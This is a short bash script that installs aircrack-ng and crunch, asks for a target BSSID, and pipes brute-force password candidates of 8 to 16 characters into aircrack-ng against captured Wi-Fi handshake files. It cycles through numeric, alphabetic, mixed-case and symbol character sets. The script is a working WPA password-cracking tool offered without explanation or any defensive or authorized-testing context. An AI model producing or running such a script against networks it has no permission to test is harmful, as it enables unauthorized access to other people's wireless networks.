#!/bin/bash
clear

INST_DEB_1='aircrack-ng'
INST_DEB_2='crunch'
if dpkg --get-selections $INST_DEB_1 2> /dev/null | grep -oE install &> /dev/null;
 then echo " $INST_DEB_1 OK"
 else sudo apt install $INST_DEB_1
fi
if dpkg --get-selections $INST_DEB_2 2> /dev/null | grep -oE install &> /dev/null;
 then echo " $INST_DEB_2 OK"
 else sudo apt install $INST_DEB_2
fi

file="/home/$USER/NG"
if [ -d $file ]; 
 then cd /home/$USER/NG
 else mkdir /home/$USER/NG
      cd /home/$USER/NG
fi

pwd
sleep 2
echo "";
sleep 1
echo " BSSID [F8:32:E4:44:73:A4]"
read B

crunch 8 16 0123456789 | aircrack-ng -w - *.cap -b $B
crunch 8 16 0123456789qwertyuiopasdfghjklzxcvbnm | aircrack-ng -w - *.cap -b $B
crunch 8 16 0123456789QWERTYUIOPASDFGHJKLZXCVBNM\(\)\[\]\{\}\!\@\#\$ | aircrack-ng -w - *.cap -b $B
crunch 8 16 qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM | aircrack-ng -w - *.cap -b $B
crunch 8 16 0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM | aircrack-ng -w - *.cap -b $B
crunch 8 16 0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM\(\)\[\]\{\}\!\@\#\$ | aircrack-ng -w - *.cap -b $B
